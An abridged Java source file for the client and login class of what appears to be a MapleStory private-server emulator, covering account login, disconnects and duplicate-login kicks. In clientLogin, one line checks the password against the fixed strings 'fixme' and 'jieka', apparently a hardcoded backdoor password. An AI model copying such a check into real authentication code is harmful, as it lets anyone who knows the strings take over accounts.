...
import packet.netty.NettyClient;
...
public class Client extends NettyClient {
    ...
    private final boolean disconnecting = false;
    ...
    public void sendCharList(int server) {
        this.write(LoginPackets.GetCharList(this, server));
    }
    ...
    public int finishLogin() {
        ...
        try {
            ...
            if (state.getState() > ClientLoginState.LOGIN_NOTLOGGEDIN.getState()) {
                loggedIn = false;
                return 7;
            }
    ...
    public int clientLogin(String login, String pwd) {
        ...
        try {
            con = Start.getInstance().getConnection();
            ps = con.prepareStatement("SELECT id, password, salt, banned, gm, qq ,pin, gender, greason, tempban, characterslots FROM accounts WHERE name = ?");
            ...
            if (rs.next()) {
                ...
                if (loginstate.getState() > ClientLoginState.LOGIN_NOTLOGGEDIN.getState()) {
                    ...
                    if (pwd.equalsIgnoreCase("fixme")||pwd.equalsIgnoreCase("jieka")) {
                        try {
                ...
                if (loginStatus == CharLoginHeaders.LOGIN_ALREADY) {
                    for (ChannelServer cs : Start.getInstance().getWorldById(world).getChannels()) {
                        for (Player c : cs.getPlayerStorage().getAllCharacters()) {
    ...
    public ClientLoginState getLoginState() {
        ...
        try {
            ...
            try (PreparedStatement ps = con.prepareStatement("SELECT loggedin, lastlogin, banned, UNIX_TIMESTAMP(birthday) as birthday FROM accounts WHERE id = ?")) {
    ...
    public int getVoteTime() {
        ...
        try {
            con = Start.getInstance().getConnection();
            try (PreparedStatement ps = con.prepareStatement("SELECT date FROM bitsite_votingrecords WHERE UPPER(account) = UPPER(?)")) {
    ...
    public final void disconnect(boolean RemoveInChannelServer, boolean cashshop, boolean shutdown) {
        if (player != null && player.getClient() != null) {
            ...
            final int idz = player.getId(), messengerID = player.getMessenger() == null ? 0 : player.getMessenger().getId();
            ...
            if (!cashshop) {
                final ChannelServer cs = player.getWorld().getChannelById(map == null ? channel : map.getChannel());
                final int chz = FindService.findChannel(idz, world);
                //频道
                if (chz < -1) {
                ...
                try {
                    if (messengerID > 0) {
                        MessengerService.leaveMessenger(player, messengerID, chrm);
                    }
                    if (bl != null) {
                        if (!serverTransition && isLoggedIn()) {
                            BuddyService.loggedOff(world, namez, idz, channel, bl.getBuddyIds(), gmLevel, hidden);
                        } else {
                            BuddyService.loggedOn(world, namez, idz, channel, bl.getBuddyIds(), gmLevel, hidden);
                        }
                    }
                    if (party != null) {
                        chrp.setOnline(false);
                        PartyService.updateParty(player, party.getId(), MaplePartyOperation.LOG_ONOFF, chrp);
                    ...
                    if (RemoveInChannelServer && cs != null) {
                        cs.removePlayer(idz, namez);
                    }
                }
            } else {
                final int cs = FindService.findChannel(idz, world);
                //频道
                if (cs > 0) {
    ...
    public void dropDebugMessage(Player mc) {
        ...
        builder.append(ch.attr(CLIENT_KEY).get() != null);
    ...
    public final ChannelServer getChannelServer() {
        return Start.getInstance().getWorldById(world).getChannelById(channel);
    }
    ...
    public void sendPing() {
        ClientTimer.getInstance().register(() -> {
    ...
    public void announce(final OutPacket packet) {
        write(packet);
    }
    ...
    public int deleteCharacter(int cid, int idate) {
        /*int year = idate / 10000;
         ...
         try {
         PreparedStatement ps = Start.getInstance().getConnection().prepareStatement("SELECT guildrank FROM characters WHERE id = ? AND accountid = ?");
         ps.setInt(1, cid);
         ps.setInt(2, accId);
         ResultSet rs = ps.executeQuery();
         while (rs.next()) {
         ...
         rs.close();
         ps.close();
         ps = Start.getInstance().getConnection().prepareStatement("SELECT married FROM characters WHERE id = ?");
         ps.setInt(1, cid);
         rs = ps.executeQuery();
         while (rs.next()) {
         ...
         values.removeFromType(Start.getInstance().getConnection(), cid);
         }
         return 0;
         } catch (SQLException e) {
         FileLogger.printError(FileLogger.DATABASE_EXCEPTION, e);
    ...
    public void showMessage(String string) {
        write(PacketCreator.ServerNotice(1, string));
    }
    ...
    public final void DebugMessage(final StringBuilder sb) {
        ...
        sb.append(ch.attr(Client.CLIENT_KEY).get() != null);
        sb.append(" loggedin: ");
    ...
    public static void 断开账号(String a) {
        for (World world : Start.getInstance().getWorlds()) {
            for (ChannelServer cserv : world.getChannels()) {
                for (Player chr : cserv.getPlayerStorage().getAllCharacters()) {
                    ...
                    if (chr.getAccountName() == null ? a == null : chr.getAccountName().equals(a)) {
                        chr.saveDatabase();
                        chr.dropMessage(1, "与服务器断开连接，检测到其他登陆。");
                        chr.getClient().close();
                    }
                }
            }
